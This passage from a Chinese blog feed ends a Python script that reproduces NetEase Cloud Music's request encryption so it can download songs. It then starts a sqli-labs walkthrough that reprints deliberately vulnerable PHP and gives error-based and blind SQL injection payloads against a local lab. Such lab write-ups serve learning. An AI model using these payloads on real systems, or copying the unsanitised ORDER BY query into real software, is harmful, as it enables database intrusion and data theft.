len(b)</span><br><span class="line">    <span class="keyword">for</span> _ <span class="keyword">in</span> range(a):</span><br><span class="line">        c += b[int(random.random()*length)]</span><br><span class="line">    <span class="keyword">return</span> c</span><br><span class="line"></span><br><span class="line"><span class="comment">#aes加密</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">aes_encrypt</span><span class="params">(data,key,iv,mode=AES.MODE_CBC)</span>:</span></span><br><span class="line">    <span class="string">"""</span></span><br><span class="line"><span class="string">    data:明文</span></span><br><span class="line"><span class="string">    key:密钥</span></span><br><span class="line"><span class="string">    iv:偏移量</span></span><br><span class="line"><span class="string">    mode:模式，默认为CBC模式</span></span><br><span class="line"><span class="string">    """</span></span><br><span class="line">    encryptor=AES.new(key.encode(<span class="string">'utf-8'</span>),mode=mode,IV=iv.encode(<span class="string">'utf-8'</span>))</span><br><span class="line">    <span class="comment">#补位操作</span></span><br><span class="line">    _data = pad(data,<span class="number">16</span>)</span><br><span class="line">    encrypted_data = encryptor.encrypt(_data)</span><br><span class="line">    <span class="keyword">return</span> base64.b64encode(encrypted_data)</span><br><span class="line"></span><br><span class="line"><span class="comment">#aes解密</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">aes_decrypt</span><span class="params">(data,key,iv,mode=AES.MODE_CBC)</span>:</span></span><br><span class="line">    <span class="string">"""</span></span><br><span class="line"><span class="string">    data:密文</span></span><br><span class="line"><span class="string">    key:密钥</span></span><br><span class="line"><span class="string">    iv:偏移量</span></span><br><span class="line"><span class="string">    mode:模式，默认为CBC模式</span></span><br><span class="line"><span class="string">    """</span></span><br><span class="line">    decryptor = AES.new(key,mode=mode,IV=iv)</span><br><span class="line">    <span class="keyword">return</span> decryptor.decrypt(data)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">netEase_AES_encrypt</span><span class="params">(data,key1,key2,iv,mode=AES.MODE_CBC)</span>:</span></span><br><span class="line">    <span class="string">"""</span></span><br><span class="line"><span class="string">    data:明文</span></span><br><span class="line"><span class="string">    key1:第一阶段密钥</span></span><br><span class="line"><span class="string">    key2:第二阶段密钥</span></span><br><span class="line"><span class="string">    iv:偏移量</span></span><br><span class="line"><span class="string">    mode:模式，默认为CBC模式</span></span><br><span class="line"><span class="string">    """</span></span><br><span class="line">    <span class="keyword">if</span> isinstance(data,dict):</span><br><span class="line">        _data = dictSerialize(data)</span><br><span class="line">    _data = str(data)</span><br><span class="line">    _encryptedData = aes_encrypt(_data,key1,iv,mode)</span><br><span class="line">    _encryptedData = aes_encrypt(_encryptedData,key2,iv,mode)</span><br><span class="line">    <span class="keyword">return</span> _encryptedData.decode(<span class="string">'utf8'</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">netEase_AES_decryot</span><span class="params">(data,key1,key2,iv,mode=AES.MODE_CBC)</span>:</span></span><br><span class="line">    <span class="string">"""</span></span><br><span class="line"><span class="string">    data:密文</span></span><br><span class="line"><span class="string">    key1:第一阶段加密函数</span></span><br><span class="line"><span class="string">    key2:第二阶段加密函数</span></span><br><span class="line"><span class="string">    iv:偏移量</span></span><br><span class="line"><span class="string">    mode:模式，默认为CBC模式</span></span><br><span class="line"><span class="string">    """</span></span><br><span class="line">    _data = base64.b64decode(data)</span><br><span class="line">    plaintext = aes_decrypt(_data,key2,iv,mode)</span><br><span class="line">    plaintext = base64.b64decode(plaintext)</span><br><span class="line">    plaintext = aes_decrypt(plaintext,key1,iv,mode)</span><br><span class="line">    plaintext = plaintext.decode(<span class="string">'utf8'</span>)</span><br><span class="line">    <span class="keyword">return</span> plaintext</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">netEase_RSA_encrypt_NoPadding</span><span class="params">(data:str,publickey:str,module:str)</span>:</span></span><br><span class="line">    <span class="string">"""</span></span><br><span class="line"><span class="string">    RSA采用Nopadding方式，即明文先倒排，再在前面补0</span></span><br><span class="line"><span class="string">    data:明文</span></span><br><span class="line"><span class="string">    publickey:公钥</span></span><br><span class="line"><span class="string">    module:RSA中两个大质数的乘积</span></span><br><span class="line"><span class="string">    """</span></span><br><span class="line">    <span class="comment">#网易云云音乐中js加密采用的算法中的参数是以16进制来操作的</span></span><br><span class="line">    _publickey = int(publickey,<span class="number">16</span>)</span><br><span class="line">    _module = int(module,<span class="number">16</span>)</span><br><span class="line">    _data = data[::<span class="number">-1</span>]</span><br><span class="line">    _data = int(codecs.encode(_data.encode(<span class="string">'utf8'</span>),<span class="string">'hex'</span>),<span class="number">16</span>)</span><br><span class="line">    <span class="comment">#RSA加密过程</span></span><br><span class="line">    rs = _data**_publickey%_module</span><br><span class="line">    <span class="comment">#返回16进制解码，前面补0补足256位的字符串</span></span><br><span class="line">    <span class="keyword">return</span> format(rs,<span class="string">'x'</span>).zfill(<span class="number">256</span>)</span><br></pre></td></tr></table></figure></p><p>search.py<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#author:九世</span></span><br><span class="line"><span class="comment">#time:2019/2/11</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">from</span> netEaseMusicEncrypt <span class="keyword">import</span> rand_a, netEase_AES_encrypt,netEase_RSA_encrypt_NoPadding,dictSerialize,aes_encrypt</span><br><span class="line"><span class="keyword">import</span> webbrowser</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"></span><br><span class="line">musica=&#123;&#125;</span><br><span class="line"></span><br><span class="line">print(<span class="string">'作者：By 九世'</span>)</span><br><span class="line">print(<span class="string">'网易云音乐搜索'</span>)</span><br><span class="line">print(<span class="string">''</span>)</span><br><span class="line">user = input(<span class="string">'输入你要搜索的歌手或歌曲名称：'</span>)</span><br><span class="line">query = &#123;<span class="string">"s"</span>: <span class="string">"&#123;&#125;"</span>.format(user), <span class="string">"limit"</span>: <span class="string">"8"</span>, <span class="string">"csrf_token"</span>: <span class="string">""</span>&#125;</span><br><span class="line">key1 = <span class="string">"0CoJUm6Qyw8W8jud"</span></span><br><span class="line">iv = <span class="string">"0102030405060708"</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># 公钥对，hex16进制编码</span></span><br><span class="line">module = <span class="string">"00e0b509f6259df8642dbc35662901477df22677ec152b5ff68a\</span></span><br><span class="line"><span class="string">ce615bb7b725152b3ab17a876aea8a5aa76d2e417629ec4ee341f56135fccf695280104e0312ecbda92557c93870114af6c9d05c4f7f0c3685b7a46bee255932575cce10b424d813cfe4875d3e82047b97ddef52741d546b8e289dc6935b3ece0462db0a22b8e7"</span></span><br><span class="line">publickey = <span class="string">"010001"</span></span><br><span class="line">    <span class="comment"># 序列化查询dict</span></span><br><span class="line">queryStr = dictSerialize(query)</span><br><span class="line"></span><br><span class="line">aaa = aes_encrypt(queryStr, key1, iv)</span><br><span class="line">    <span class="comment"># AES加密随机量</span></span><br><span class="line">key2 = rand_a()</span><br><span class="line">secretStr = netEase_AES_encrypt(queryStr, key1, key2, iv)  <span class="comment"># 加密后的params</span></span><br><span class="line">rsaSec = netEase_RSA_encrypt_NoPadding(key2, publickey, module)  <span class="comment"># 加密后的key</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Search</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span><span class="params">(self,headers,url,data)</span>:</span></span><br><span class="line">        self.headers=headers</span><br><span class="line">        self.url=url</span><br><span class="line">        self.data=data</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">reqt</span><span class="params">(self)</span>:</span></span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            rqt=requests.post(url=self.url,headers=self.headers,data=self.data)</span><br><span class="line">            jsons=rqt.json()</span><br><span class="line"></span><br><span class="line">            result=jsons[<span class="string">'result'</span>]</span><br><span class="line">            songs=result[<span class="string">'songs'</span>]</span><br><span class="line">            <span class="keyword">for</span> s <span class="keyword">in</span> songs:</span><br><span class="line">                print(<span class="string">'歌曲名称：&#123;&#125; 下载ID：&#123;&#125;'</span>.format(s[<span class="string">'name'</span>],s[<span class="string">'id'</span>]))</span><br><span class="line">                musica[s[<span class="string">'name'</span>]]=s[<span class="string">'id'</span>]</span><br><span class="line"></span><br><span class="line">        <span class="keyword">except</span> Exception <span class="keyword">as</span> r:</span><br><span class="line">            print(<span class="string">'[-] 报错：&#123;&#125;'</span>.format(r))</span><br><span class="line">            <span class="keyword">return</span> <span class="string">''</span></span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">music</span><span class="params">(self)</span>:</span></span><br><span class="line">        print(<span class="string">''</span>)</span><br><span class="line">        ids=input(<span class="string">'请输入歌曲的名称,q退出：'</span>)</span><br><span class="line">        <span class="keyword">if</span> ids <span class="keyword">in</span> musica.keys():</span><br><span class="line">            print(<span class="string">'[+] 自动打开默认浏览器，在线试听'</span>)</span><br><span class="line">            value=musica.get(ids)</span><br><span class="line">            url=<span class="string">'http://music.163.com/song/media/outer/url?id=&#123;&#125;'</span>.format(value)</span><br><span class="line">            webbrowser.open(url)</span><br><span class="line">        <span class="keyword">elif</span> ids==<span class="string">'q'</span>:</span><br><span class="line">            print(<span class="string">'退出...'</span>)</span><br><span class="line">            exit()</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            print(<span class="string">'[-] 找不到歌曲'</span>)</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">download</span><span class="params">(self)</span>:</span></span><br><span class="line">        print(<span class="string">''</span>)</span><br><span class="line">        ids = input(<span class="string">'请输入歌曲的名称，q是退出：'</span>)</span><br><span class="line">        <span class="keyword">if</span> ids <span class="keyword">in</span> musica.keys():</span><br><span class="line">            print(<span class="string">'[+] 下载中'</span>)</span><br><span class="line">            value = musica.get(ids)</span><br><span class="line">            url = <span class="string">'http://music.163.com/song/media/outer/url?id=&#123;&#125;'</span>.format(value)</span><br><span class="line">            rst=requests.get(url=url,headers=self.headers)</span><br><span class="line">            rst2=requests.get(url=rst.url,headers=self.headers)</span><br><span class="line">            xj=open(<span class="string">'file/&#123;&#125;.mp3'</span>.format(ids),<span class="string">'wb'</span>)</span><br><span class="line">            xj.write(rst2.content)</span><br><span class="line">            xj.close()</span><br><span class="line">            <span class="keyword">if</span> os.path.exists(<span class="string">'file/&#123;&#125;.mp3'</span>.format(ids)):</span><br><span class="line">                print(<span class="string">'[+] &#123;&#125;.mp3  下载成功'</span>.format(ids))</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                print(<span class="string">'[-] &#123;&#125;.mp3 下载失败'</span>.format(ids))</span><br><span class="line">        <span class="keyword">elif</span> ids==<span class="string">'q'</span>:</span><br><span class="line">            print(<span class="string">'退出...'</span>)</span><br><span class="line">            exit()</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            print(<span class="string">'[-] 找不到歌曲'</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    headers=&#123;<span class="string">'user-agent'</span>:<span class="string">'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/71.0.3578.98 Safari/537.36'</span>,<span class="string">'Content-Type'</span>: <span class="string">'application/x-www-form-urlencoded'</span>&#125;</span><br><span class="line">    url=<span class="string">'http://music.163.com/weapi/search/suggest/web?csrf_token='</span></span><br><span class="line">    data=&#123;<span class="string">'params'</span>:secretStr,<span class="string">'encSecKey'</span>:rsaSec&#125;</span><br><span class="line">    obj=Search(headers=headers,url=url,data=data)</span><br><span class="line">    rs=obj.reqt()</span><br><span class="line">    <span class="keyword">while</span> <span class="keyword">True</span>:</span><br><span class="line">        <span class="keyword">if</span> rs==<span class="number">1</span>:</span><br><span class="line">            print(<span class="string">'1.自动打开浏览器试听'</span>)</span><br><span class="line">            print(<span class="string">'2.下载'</span>)</span><br><span class="line">            print(<span class="string">'0.退出'</span>)</span><br><span class="line">            useq=input(<span class="string">'请选择：'</span>)</span><br><span class="line">            <span class="keyword">if</span> useq==<span class="string">'1'</span>:</span><br><span class="line">                <span class="keyword">while</span> <span class="keyword">True</span>:</span><br><span class="line">                    obj.music()</span><br><span class="line">            <span class="keyword">elif</span> useq==<span class="string">'2'</span>:</span><br><span class="line">                <span class="keyword">while</span> <span class="keyword">True</span>:</span><br><span class="line">                    obj.download()</span><br><span class="line">            <span class="keyword">elif</span> useq==<span class="string">'0'</span>:</span><br><span class="line">                print(<span class="string">'退出...'</span>)</span><br><span class="line">                exit()</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                print(<span class="string">'[-] 没有这个选择'</span>)</span><br></pre></td></tr></table></figure></p><p>最终测试结果：<br><img src="https://s2.ax1x.com/2019/02/12/kdT0ZF.png" alt="kdT0ZF.png"></p><p><img src="https://s2.ax1x.com/2019/02/12/kdTyGR.md.jpg" alt="kdTyGR.md.jpg"></p><p><img src="https://s2.ax1x.com/2019/02/12/kdT6R1.png" alt="kdT6R1.png"></p><p>然后打包成EXE扔给她:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pyinstaller  -F &lt;file&gt;</span><br></pre></td></tr></table></figure></p><p>转载请声明：转自422926799.github.io</p>]]></content>
      
      
        <tags>
            
            <tag> Writing </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>sqli-labs Less 46 -&gt; 49</title>
      <link href="/posts/5020e8a3.html"/>
      <url>/posts/5020e8a3.html</url>
      <content type="html"><![CDATA[<h3 id="目录"><a href="#目录" class="headerlink" title="目录"></a>目录</h3><ul><li>前言</li><li>sqli-labs第46关到第49关</li></ul><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>复习了一波注入和顺便闯了几关。这次是46-49关<br><img src="http://i0.hdslb.com/bfs/archive/ba2e3758b8732b793928efff31139de0538b728a.jpg" alt="ba2e3758b8732b793928efff31139de0538b728a.jpg"></p><h2 id="sqli-labs第46关到49关"><a href="#sqli-labs第46关到49关" class="headerlink" title="sqli-labs第46关到49关"></a>sqli-labs第46关到49关</h2><ul><li>第46关</li><li>第47关</li><li>第48关</li><li>第49关</li></ul><p><b>第46关</b></p><hr><p>代码如下：<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br></pre></td><td class="code"><pre><span class="line">&lt;!DOCTYPE html <span class="keyword">PUBLIC</span> <span class="string">"-//W3C//DTD XHTML 1.0 Transitional//EN"</span> <span class="string">"http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd"</span>&gt;</span><br><span class="line">&lt;html xmlns=<span class="string">"http://www.w3.org/1999/xhtml"</span>&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">&lt;meta http-equiv=<span class="string">"Content-Type"</span> content=<span class="string">"text/html; charset=utf-8"</span> /&gt;</span><br><span class="line">&lt;title&gt;ORDER BY-Error-Numeric&lt;/title&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line"></span><br><span class="line">&lt;body bgcolor=<span class="string">"#000000"</span>&gt;</span><br><span class="line">&lt;div style=<span class="string">" margin-top:70px;color:#FFF; font-size:23px; text-align:center"</span>&gt;Welcome&amp;nbsp;&amp;nbsp;&amp;nbsp;&lt;font color=<span class="string">"#FF0000"</span>&gt; Dhakkan &lt;/font&gt;&lt;br&gt;</span><br><span class="line">&lt;font size=<span class="string">"3"</span> color=<span class="string">"#FFFF00"</span>&gt;</span><br><span class="line"></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span>(<span class="string">"../sql-connections/sql-connect.php"</span>);</span><br><span class="line">$id=$_GET[<span class="string">'sort'</span>];</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($id))</span><br><span class="line">&#123;</span><br><span class="line"><span class="comment">//logging the connection parameters to a file for analysis.</span></span><br><span class="line">$fp=fopen(<span class="string">'result.txt'</span>,<span class="string">'a'</span>);</span><br><span class="line">fwrite($fp,<span class="string">'SORT:'</span>.$id.<span class="string">"\n"</span>);</span><br><span class="line">fclose($fp);</span><br><span class="line"></span><br><span class="line">$sql = <span class="string">"SELECT * FROM users ORDER BY $id"</span>;</span><br><span class="line">$result = mysql_query($sql);</span><br><span class="line"><span class="keyword">if</span> ($result)</span><br><span class="line">&#123;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">&lt;center&gt;</span><br><span class="line">&lt;font color= <span class="string">"#00FF00"</span> size=<span class="string">"4"</span>&gt;</span><br><span class="line"></span><br><span class="line">&lt;table   border=<span class="number">1</span><span class="string">'&gt;</span></span><br><span class="line"><span class="string">&lt;tr&gt;</span></span><br><span class="line"><span class="string">&lt;th&gt;&amp;nbsp;ID&amp;nbsp;&lt;/th&gt;</span></span><br><span class="line"><span class="string">&lt;th&gt;&amp;nbsp;USERNAME&amp;nbsp;  &lt;/th&gt;</span></span><br><span class="line"><span class="string">&lt;th&gt;&amp;nbsp;PASSWORD&amp;nbsp;  &lt;/th&gt;</span></span><br><span class="line"><span class="string">&lt;/tr&gt;</span></span><br><span class="line"><span class="string">&lt;/font&gt;</span></span><br><span class="line"><span class="string">&lt;/font&gt;</span></span><br><span class="line"><span class="string">&lt;?php</span></span><br><span class="line"><span class="string">while ($row = mysql_fetch_assoc($result))</span></span><br><span class="line"><span class="string">&#123;</span></span><br><span class="line"><span class="string">echo '</span>&lt;font color= <span class="string">"#00FF11"</span> size=<span class="string">"3"</span>&gt;<span class="string">';</span></span><br><span class="line"><span class="string">echo "&lt;tr&gt;";</span></span><br><span class="line"><span class="string">    echo "&lt;td&gt;".$row['</span>id<span class="string">']."&lt;/td&gt;";</span></span><br><span class="line"><span class="string">    echo "&lt;td&gt;".$row['</span>username<span class="string">']."&lt;/td&gt;";</span></span><br><span class="line"><span class="string">    echo "&lt;td&gt;".$row['</span>password<span class="string">']."&lt;/td&gt;";</span></span><br><span class="line"><span class="string">echo "&lt;/tr&gt;";</span></span><br><span class="line"><span class="string">echo "&lt;/font&gt;";</span></span><br><span class="line"><span class="string">&#125;</span></span><br><span class="line"><span class="string">echo "&lt;/table&gt;";</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">&#125;</span></span><br><span class="line"><span class="string">else</span></span><br><span class="line"><span class="string">&#123;</span></span><br><span class="line"><span class="string">echo '</span>&lt;font color= <span class="string">"#FFFF00"</span>&gt;<span class="string">';</span></span><br><span class="line"><span class="string">print_r(mysql_error());</span></span><br><span class="line"><span class="string">echo "&lt;/font&gt;";  </span></span><br><span class="line"><span class="string">&#125;</span></span><br><span class="line"><span class="string">&#125;</span></span><br><span class="line"><span class="string">else</span></span><br><span class="line"><span class="string">&#123;</span></span><br><span class="line"><span class="string">echo "Please input parameter as SORT with numeric value&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;";</span></span><br><span class="line"><span class="string">echo "&lt;br&gt;&lt;br&gt;&lt;br&gt;";</span></span><br><span class="line"><span class="string">echo '</span>&lt;img src=<span class="string">"../images/Less-46.jpg"</span> /&gt;&lt;br&gt;<span class="string">';</span></span><br><span class="line"><span class="string">echo "Lesson Concept and code Idea by &lt;b&gt;D4rk&lt;/b&gt;";</span></span><br><span class="line"><span class="string">&#125;</span></span><br><span class="line"><span class="string">?&gt;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">&lt;/font&gt; &lt;/div&gt;&lt;/br&gt;&lt;/br&gt;&lt;/br&gt;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">&lt;/center&gt; </span></span><br><span class="line"><span class="string">&lt;/body&gt;</span></span><br><span class="line"><span class="string">&lt;/html&gt;</span></span><br></pre></td></tr></table></figure></p><p>查询语句是<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select * from users order by id=</span><br></pre></td></tr></table></figure></p><p><img src="https://s2.ax1x.com/2019/02/11/ka0feO.md.png" alt=""><br>根据查询语句给出payload<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">报错注入：http://127.0.0.1/sqli-labs-master/Less-46/?sort=updatexml(1,concat(0x7e,(select%20user()),0x7e),1)</span><br><span class="line">盲注：http://127.0.0.1/sqli-labs-master/Less-46/?sort=rand(ascii(substr((select%20table_name%20from%20information_schema.tables%20where%20table_schema=%22security%22%20limit%200,1),6,1)))</span><br><span class="line">盲注时返回的数据不一样</span><br></pre></td></tr></table></figure></p><p><img src="https://s2.ax1x.com/2019/02/11/ka0IFH.png" alt="ka0IFH.png"><br><img src="https://s2.ax1x.com/2019/02/11/ka0HSI.png" alt="ka0HSI.png"></p><p><b>第四十七关</b></p><hr><p>代码如下：<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br></pre></td><td class="code"><pre><span class="line">&lt;!DOCTYPE html <span class="keyword">PUBLIC</span> <span class="string">"-//W3C//DTD XHTML 1.0 Transitional//EN"</span> <span class="string">"http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd"</span>&gt;</span><br><span class="line">&lt;html xmlns=<span class="string">"http://www.w3.org/1999/xhtml"</span>&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">&lt;meta http-equiv=<span class="string">"Content-Type"</span> content=<span class="string">"text/html; charset=utf-8"</span> /&gt;</span><br><span class="line">&lt;title&gt;ORDER BY Clause-Error-Single quote&lt;/title&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line"></span><br><span class="line">&lt;body bgcolor=<span class="string">"#000000"</span>&gt;</span><br><span class="line">&lt;div style=<span class="string">" margin-top:70px;color:#FFF; font-size:23px; text-align:center"</span>&gt;Welcome&amp;nbsp;&amp;nbsp;&amp;nbsp;&lt;font color=<span class="string">"#FF0000"</span>&gt; Dhakkan &lt;/font&gt;&lt;br&gt;</span><br><span class="line">&lt;font size=<span class="string">"3"</span> color=<span class="string">"#FFFF00"</span>&gt;</span><br><span class="line"></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span>(<span class="string">"../sql-connections/sql-connect.php"</span>);</span><br><span class="line">$id=$_GET[<span class="string">'sort'</span>];</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($id))</span><br><span class="line">&#123;</span><br><span class="line"><span class="comment">//logging the connection parameters to a file for analysis.</span></span><br><span class="line">$fp=fopen(<span class="string">'result.txt'</span>,<span class="string">'a'</span>);</span><br><span class="line">fwrite($fp,<span class="string">'SORT:'</span>.$id.<span class="string">"\n"</span>);</span><br><span class="line">fclose($fp);</span><br><span class="line"></span><br><span class="line">$sql = <span class="string">"SELECT * FROM users ORDER BY '$id'"</span>;</span><br><span class="line"><span class="keyword">echo</span> $sql.<span class="string">"&lt;br&gt;"</span>;</span><br><span class="line">$result = mysql_query($sql);</span><br><span class="line"><span class="keyword">if</span> ($result)</span><br><span class="line">&#123;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">&lt;center&gt;</span><br><span class="line">&lt;font color= <span class="string">"#00FF00"</span> size=<span class="string">"4"</span>&gt;</span><br><span class="line"></span><br><span class="line">&lt;table   border=<span class="number">1</span><span class="string">'&gt;</span></span><br><span class="line"><span class="string">&lt;tr&gt;</span></span><br><span class="line"><span class="string">&lt;th&gt;&amp;nbsp;ID&amp;nbsp;&lt;/th&gt;</span></span><br><span class="line"><span class="string">&lt;th&gt;&amp;nbsp;USERNAME&amp;nbsp;  &lt;/th&gt;</span></span><br><span class="line"><span class="string">&lt;th&gt;&amp;nbsp;PASSWORD&amp;nbsp;  &lt;/th&gt;</span></span><br><span class="line"><span class="string">&lt;/tr&gt;</span></span><br><span class="line"><span 